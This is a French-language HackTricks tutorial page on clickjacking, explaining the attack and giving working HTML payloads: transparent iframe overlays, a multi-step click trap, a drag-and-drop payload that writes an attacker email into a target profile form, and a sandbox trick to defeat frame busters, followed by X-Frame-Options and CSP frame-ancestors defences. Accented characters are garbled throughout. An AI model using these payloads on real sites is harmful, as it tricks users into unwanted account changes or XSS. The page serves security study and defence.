# Clickjacking

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser des workflows** gr√¢ce aux outils communautaires **les plus avanc√©s**.\
Acc√©dez-y d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Qu'est-ce que le Clickjacking

Le Clickjacking est une attaque qui **trompe** un **utilisateur** pour qu'il **clique** sur un **√©l√©ment** d'une page web qui est **invisible** ou d√©guis√© en un autre √©l√©ment. Cela peut amener les utilisateurs √† t√©l√©charger malgr√© eux des logiciels malveillants, visiter des pages web malveillantes, fournir des identifiants ou des informations sensibles, transf√©rer de l'argent ou acheter des produits en ligne. (Depuis [ici](https://www.imperva.com/learn/application-security/clickjacking/)).

### Astuce pour pr√©remplir des formulaires

Il est parfois possible de **remplir la valeur des champs d'un formulaire en utilisant des param√®tres GET lors du chargement d'une page**. Un attaquant peut abuser de ce comportement pour remplir un formulaire avec des donn√©es arbitraires et envoyer la charge utile de clickjacking pour que l'utilisateur appuie sur le bouton Envoyer.

### Remplir un formulaire avec Drag\&Drop

Si vous avez besoin que l'utilisateur **remplisse un formulaire** mais que vous ne voulez pas lui demander directement d'√©crire des informations sp√©cifiques (comme l'email ou un mot de passe sp√©cifique que vous connaissez), vous pouvez simplement lui demander de **Drag\&Drop** quelque chose qui √©crira vos donn√©es contr√¥l√©es comme dans [**cet exemple**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Charge utile de base
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Charge utile en plusieurs √©tapes
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Payload de Drag\&Drop + Clic
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Si vous avez identifi√© une **attaque XSS qui n√©cessite un clic** de l'utilisateur sur un √©l√©ment pour **d√©clencher** l'XSS et que la page est **vuln√©rable au clickjacking**, vous pourriez en abuser pour tromper l'utilisateur et le faire cliquer sur le bouton/lien.\
Exemple :\
_Vous avez trouv√© un **self XSS** dans certains d√©tails priv√©s du compte (d√©tails que **seul vous pouvez d√©finir et lire**). La page avec le **formulaire** pour d√©finir ces d√©tails est **vuln√©rable** au **Clickjacking** et vous pouvez **pr√©remplir** le **formulaire** avec les param√®tres GET._\
\_\_Un attaquant pourrait pr√©parer une attaque de **Clickjacking** sur cette page en **pr√©remplissant** le **formulaire** avec le **payload XSS** et en **trompant** l'**utilisateur** pour qu'il **soumette** le formulaire. Ainsi, **lorsque le formulaire est soumis** et que les valeurs sont modifi√©es, l'**utilisateur ex√©cutera l'XSS**.

## Comment √©viter le Clickjacking

### D√©fenses c√¥t√© client

Il est possible d'ex√©cuter des scripts c√¥t√© client qui effectuent certains ou tous les comportements suivants pour pr√©venir le Clickjacking :

* v√©rifier et s'assurer que la fen√™tre de l'application actuelle est la fen√™tre principale ou sup√©rieure,
* rendre toutes les frames visibles,
* emp√™cher les clics sur des frames invisibles,
* intercepter et signaler les attaques de clickjacking potentielles sur un utilisateur.

#### Contournement

Comme les frame busters sont des scripts JavaScript, les param√®tres de s√©curit√© du navigateur peuvent emp√™cher leur fonctionnement ou m√™me le navigateur pourrait ne pas supporter JavaScript. Une solution efficace pour un attaquant contre les frame busters est d'utiliser l'attribut `sandbox` de l'**iframe HTML5**. Lorsqu'il est d√©fini avec les valeurs `allow-forms` ou `allow-scripts` et que la valeur `allow-top-navigation` est omise, le script de frame buster peut √™tre neutralis√© car l'iframe ne peut pas v√©rifier s'il est ou non la fen√™tre sup√©rieure :
```markup
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
```markdown
Les valeurs `allow-forms` et `allow-scripts` permettent les actions sp√©cifi√©es dans l'iframe, mais la navigation de niveau sup√©rieur est d√©sactiv√©e. Cela emp√™che les comportements de d√©jouement de cadre tout en autorisant les fonctionnalit√©s au sein du site cibl√©.

Selon le type d'attaque de Clickjacking effectu√©e, **vous pourriez √©galement devoir autoriser** : `allow-same-origin` et `allow-modals` ou [encore plus](https://www.w3schools.com/tags/att_iframe_sandbox.asp). Lors de la pr√©paration de l'attaque, v√©rifiez simplement la console du navigateur, elle peut vous indiquer quels autres comportements vous devez autoriser.

### X-Frame-Options

L'**en-t√™te de r√©ponse HTTP `X-Frame-Options`** peut √™tre utilis√© pour indiquer si un navigateur doit √™tre **autoris√©** √† rendre une page dans un `<frame>` ou `<iframe>`. Les sites peuvent utiliser cela pour √©viter les attaques de Clickjacking, en s'assurant que **leur contenu n'est pas int√©gr√© dans d'autres sites**. D√©finissez l'en-t√™te **`X-Frame-Options`** pour toutes les r√©ponses contenant du contenu HTML. Les valeurs possibles sont :

* `X-Frame-Options: deny` qui **emp√™che tout domaine d'encadrer le contenu** _(Valeur recommand√©e)_
* `X-Frame-Options: sameorigin` qui **autorise uniquement le site actuel** √† encadrer le contenu.
* `X-Frame-Options: allow-from https://trusted.com` qui **autorise l'uri sp√©cifi√©** √† encadrer cette page.
* V√©rifiez les limitations ci-dessous car **cela √©chouera si le navigateur ne le prend pas en charge**.
* D'autres navigateurs prennent en charge la nouvelle directive **CSP frame-ancestors √† la place**. Quelques-uns prennent en charge les deux.

### Directive frame-ancestors de la politique de s√©curit√© du contenu (CSP)

La **protection recommand√©e contre le clickjacking** consiste √† int√©grer la directive **`frame-ancestors`** dans la politique de s√©curit√© du contenu de l'application.\
La directive **`frame-ancestors 'none'`** est similaire dans son comportement √† la directive **X-Frame-Options `deny`** (_Personne ne peut encadrer la page_).\
La directive **`frame-ancestors 'self'`** est largement √©quivalente √† la directive **X-Frame-Options `sameorigin`** (_seul le site actuel peut l'encadrer_).\
La directive **`frame-ancestors trusted.com`** est largement √©quivalente √† la directive **X-Frame-Options** `allow-from` (_seul le site de confiance peut l'encadrer_).

La CSP suivante autorise les cadres uniquement pour le m√™me domaine :

`Content-Security-Policy: frame-ancestors 'self';`

Consultez la documentation suivante pour plus de d√©tails et des exemples plus complexes :

* [https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)

### Limitations <a href="#limitations" id="limitations"></a>

* **Prise en charge par le navigateur :** Les frame-ancestors CSP ne sont pas encore pris en charge par tous les principaux navigateurs.
* **X-Frame-Options a la priorit√© :** [La section "Relation to X-Frame-Options" de la sp√©cification CSP](https://w3c.github.io/webappsec/specs/content-security-policy/#frame-ancestors-and-frame-options) dit : "_Si une ressource est livr√©e avec une politique qui comprend une directive nomm√©e frame-ancestors et dont la disposition est "enforce", alors l'en-t√™te X-Frame-Options DOIT √™tre ignor√©_", mais Chrome 40 & Firefox 35 ignorent la directive frame-ancestors et suivent l'en-t√™te X-Frame-Options √† la place.

## R√©f√©rences

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et **automatiser des workflows** aliment√©s par les outils communautaires **les plus avanc√©s**.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
